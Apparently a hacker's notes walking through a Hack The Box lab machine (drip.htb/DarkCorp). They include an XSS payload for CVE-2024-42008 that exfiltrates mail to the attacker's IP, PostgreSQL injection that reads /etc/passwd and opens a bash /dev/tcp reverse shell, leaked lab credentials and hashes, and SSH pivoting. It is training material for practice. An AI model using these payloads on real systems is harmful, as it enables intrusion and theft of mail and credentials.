# IP
- 10.10.11.54

# Nmap 
- nmap -p 1-65535 -T4 -A -v 10.10.11.54
```
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-03 20:26 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating Ping Scan at 20:26
Scanning 10.10.11.54 [2 ports]
Completed Ping Scan at 20:26, 0.02s elapsed (1 total hosts)
Initiating Connect Scan at 20:26
Scanning drip.htb (10.10.11.54) [65535 ports]
Discovered open port 22/tcp on 10.10.11.54
Discovered open port 80/tcp on 10.10.11.54
Connect Scan Timing: About 19.76% done; ETC: 20:28 (0:02:06 remaining)
Connect Scan Timing: About 59.50% done; ETC: 20:27 (0:00:42 remaining)
Completed Connect Scan at 20:27, 86.21s elapsed (65535 total ports)
Initiating Service scan at 20:27
Scanning 2 services on drip.htb (10.10.11.54)
Completed Service scan at 20:27, 6.07s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.54.
Initiating NSE at 20:27
Completed NSE at 20:27, 2.45s elapsed
Initiating NSE at 20:27
Completed NSE at 20:27, 0.11s elapsed
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
Nmap scan report for drip.htb (10.10.11.54)
Host is up (0.025s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-title: DripMail
|_Requested resource was index
|_http-favicon: Unknown favicon MD5: B0F964065616CFF6D415A5EDCFA30B97
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
Initiating NSE at 20:27
Completed NSE at 20:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.49 seconds
```

- Supposed to be a windows machine but the scan looks like a linux because the container is on 10.10.11.54

```echo "10.10.11.54 drip.htb" | sudo tee -a /etc/hosts > /dev/null ```

# Web enumeration
We register user test with password= 1234 .
We check our mails and examine the header . There, the domain drip.darkcorp.htb is visible.
We add 10.10.11.54 drip.darkcorp.htb to the hostfile.
echo "dev-a3f1-01.drip.htb" | sudo tee -a /etc/hosts > /dev/null
```echo "10.10.11.54 drip.darkcorp.htb" | sudo tee -a /etc/hosts > /dev/null```

- poke around and see that ```Roundcube Webmail 1.6.7``` is running currently

- Now we go to http://drip.htb/index#contact and fill out the Contact Us form with the details of our created user test
email=test@drip.htb.
We intercept the request with Burp Suite
```
POST /contact HTTP/1.1
Host: drip.htb
Content-Length: 86
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://drip.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://drip.htb/index
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

name=test&email=test%40drip.htb&message=test&content=text&recipient=support%40drip.htb
```

- change mail recipient to our own email in burp
```name=test&email=test%40drip.htb&message=test&content=text&recipient=test%40drip.htb```

- Now we go to our mail inbox at http://mail.drip.htb/?_task=mail&_mbox=INBOX.
- We have received the email that was originally intended for support@drip.htb.
- At the end of the email , we find another email from bcase@drip.htb

# CVE-2024-42008

- https://www.cve.org/CVERecord?id=CVE-2024-42008
- the Roundcube Webmail 1.6.7 is vulneralbe to CVE-2024-42008

- try to get ```bcase@drip.htb``` that could allow us to read the email or forewared it to us

## Important
- there is a need to obtain fresh cookies from the main site 
- and insert them under Cookie session
- under message = 3 , we can enter the message number we want to read (we’ll use 1-3, possibly 4 ).
- Also, make sure to enter our IP in this line (so we can receive the messages)."
- ``` end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(http://10.10.16.20:7777/c=${btoa(t)}))
foo=bar">Foo</body>' ```

- *side note* this whole part was a nightmare

- my cookie ```eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiYjJmNWRmYWIzOTAzYjNjMTc1ZjM2MjFhNWIxZGE2MjZhYzJkNDY2YiJ9.aLn7uA.xuGaj7uc4g5wP4h3CtKLqwwIu7c```

- Check the python file called ```xss.py```
- but I was able to start with message #1
- continue with message #2
- learn tha bcase@drip.htb must reset our password to http://dev-a3f1-01.drip.htb/ before a new login

- ```echo "dev-a3f1-01.drip.htb" | sudo tee -a /etc/hosts > /dev/null```

- I go to the link and reset the password of bcase@drip.htb

# ADD THE PROCESS FOR FIRST REVERSE SHELL


# SQLI at http://dev-a3f1-01.drip.htb/ 
- in the search you can access /etc/passwd
- ```''; SELECT pg_read_file('/etc/passwd', 0, 1000);```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x
```

- Shell als postgres auf 172.16.20.3 We use this command in the SEARCH field to spawn a reverse shell

```
'';DO $$
DECLARE
c text;
BEGIN
c := CHR(67) || CHR(79) || CHR(80) || CHR(89) || ' (SELECT '''') to program ''bash -c "bash -i >&
/dev/tcp/10.10.16.3/4444 0>&1"''';
EXECUTE c;
END $$;
```
- or if that dosent work

```
'';DO $$
DECLARE
c text;
BEGIN
c := CHR(67) || CHR(79) || CHR(80) || CHR(89) || ' (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1"''';
EXECUTE c;
END $$;--
```

- ip a
```
postgres@drip:/var/lib/postgresql/15/main$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
```

- more digging around and eventually find
```
postgres@drip:/var/www/html/dashboard$ cat .env
cat .env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

- start a bash shell and discard the output ```script /dev/null -c bash```
- also change to the postgress dir /var/backups/postgres

- decrypt the file with GPG and save it as dev-dripmail.old.sql
```
gpg --use-agent --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase 2Qa2SsBkQvsc --
decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
```

- eventually lost the nc connection but was able to get 
```
COPY public."Admins" (id, username, password, email) FROM stdin;
1 bcase dc5484871bc95c4eab58032884be7225 bcase@drip.htb
2 victor.r cac1c7b0e7008d67b6db40c03e76b9c0 victor.r@drip.htb
3 ebelford 8bbd7f88841b4223ae63c8848969be86 ebelford@drip.htb
```
- crackthem and get 
- User ebelford PW=ThePlague61780
- User victor.r PW=victor1gustavo@#

# Tunnel to 172.16.20.0/24 at User ebelford 

- We establish a tunnel to 172.16.20.0/24 over SSH with the user sshuttle
```
sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
```

- if there are issues with this command just straight ssh into a user 
- then rip a ```nmap -sL 172.16.20.0/24```

- We find 2 additional hosts:
    - 172.16.20.2 WEB-01 WEB-01.darkcorp.htb
    - 172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb =(Domain Name)
    - 172.16.20.3 drip.darkcorp.htb (Drip Mail)

# 172.16.20.2 WEB-01.darkcorp.htb 

- ```nmap -sCTV -Pn -vvv 172.16.20.2```

- We go to http://172.16.20.2:5000 and use Viktor's credentials:
- User victor.r PW= victor1gustavo@#

# User flag 
- establish a tunnel to 172.16.20.0/24
```sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24```
